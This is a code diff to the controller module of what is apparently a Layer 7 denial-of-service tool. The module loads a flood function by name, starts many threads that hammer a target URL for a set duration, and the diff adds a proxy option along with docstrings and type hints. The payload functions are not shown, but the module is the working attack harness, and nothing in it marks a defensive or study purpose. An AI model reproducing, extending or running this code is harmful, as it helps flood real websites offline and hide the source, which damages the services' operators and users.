@@ -1,71 +1,88 @@
+"""This module provides a class to instantiate DoS attacks."""
+
 import sys
 from threading import Thread
 from time import sleep, time
-from typing import Callable
+from typing import Callable, List
 
-from colorama import Fore
-from humanfriendly import Spinner, format_timespan
+from colorama import Fore  # type: ignore[import]
+from humanfriendly import Spinner, format_timespan  # type: ignore[import]
 
-from tools.crash import CriticalError
-from tools.ip_tools import get_target_address
+from tools.crash import CriticalError  # type: ignore[import]
+from tools.ip_tools import get_target_address  # type: ignore[import]
 
 
-# Returns the flood method attack
 def get_method_by_name(method: str) -> Callable:
+    """Get the flood function based on the attack method.
 
+    Keyword arguments:
+    method -- the method's name
+    """
     dir = f"tools.L7.{method.lower()}"
     module = __import__(dir, fromlist=["object"])
-    method = getattr(module, "flood")
-    return method
+    flood_function = getattr(module, "flood")
+    return flood_function
 
 
-# Controls the attack methods
 class AttackMethod:
+    """Control the attack's inner operations."""
 
-    # Constructor
-    def __init__(self, method_name, duration, threads, target):
+    def __init__(
+        self,
+        method_name: str,
+        duration: int,
+        threads: int,
+        target: str,
+        use_proxy: bool,
+    ):
+        """Initialize the attack object.
+
+        Keyword arguments:
+        method_name -- the name of the DoS method used to attack (only HTTP GET by now)
+        duration -- the duration of the attack, in seconds
+        threads -- the number of threads that will attack the target
+        target -- the target's URL
+        use_proxy -- whether or not to use proxies
+        """
         self.method_name = method_name
         self.duration = duration
         self.threads_count = threads
         self.target = target
-        self.threads = []
+        self.use_proxy = use_proxy
+        self.threads = list()  # type: List[Thread]
         self.is_running = False
 
-    # Entry-point
     def __enter__(self):
+        """Set flood function and target's URL formatted attributes."""
         self.method = get_method_by_name(self.method_name)
         self.target = get_target_address(self.target)
         return self
 
-    # Exit-point
     def __exit__(self, exc_type, exc_value, traceback):
+        """Do nothing, only for context manager."""
         pass
 
-    # Verifies the execution time
     def __run_timer(self):
+        """Verify the execution time every second."""
         __stopTime = time() + self.duration
         while time() < __stopTime:
             sleep(1)
         self.is_running = False
 
-    # Starts the flooder
     def __run_flood(self):
+        """Start the flooder."""
         while self.is_running:
-            self.method(self.target)
+            self.method(self.target, self.use_proxy)
 
-    # Starts the threads
     def __run_threads(self):
-
-        # Starts threads timing
+        """Initialize the threads."""
         timing = Thread(target=self.__run_timer)
         timing.start()
 
-        # Creates the threads flood
         for _ in range(self.threads_count):
             thread = Thread(target=self.__run_flood)
             self.threads.append(thread)
 
-        # Starts the threads flood
         with Spinner(
             label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}",
             total=100,
@@ -74,22 +91,21 @@ class AttackMethod:
                 thread.start()
                 spinner.step(100 / len(self.threads) * (index + 1))
 
-        # Waits for the thread flood to end
         for index, thread in enumerate(self.threads):
             thread.join()
             print(
                 f"{Fore.GREEN}[+] {Fore.YELLOW}Thread {index + 1} stopped.{Fore.RESET}"
             )
 
-        print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack Completed!{Fore.RESET}")
+        print(f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Completed!\n\n{Fore.RESET}")
 
-    # Starts DDOS attack
     def start(self):
+        """Start the DoS attack itself."""
         target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
         duration = format_timespan(self.duration)
         print(
-            f"{Fore.MAGENTA}[?] {Fore.BLUE}Attacking {target} using the {self.method_name} method.{Fore.RESET}\n"
-            f"{Fore.MAGENTA}[?] {Fore.BLUE}The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
+            f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attacking {target} using {self.method_name} method.{Fore.RESET}"
+            f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}.\n\n{Fore.RESET}"
         )
 
         self.is_running = True
@@ -100,15 +116,16 @@ class AttackMethod:
         except KeyboardInterrupt:
             self.is_running = False
             print(
-                f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads..{Fore.RESET}"
+                f"{Fore.RED}\n\n[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads...\n\n{Fore.RESET}"
             )
 
-            # Waits for the threads to end
             for thread in self.threads:
                 if thread.is_alive():
                     thread.join()
 
-            print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack Interrupted!{Fore.RESET}")
+            print(
+                f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Interrupted!\n\n{Fore.RESET}"
+            )
             sys.exit(1)
 
         except Exception as err:
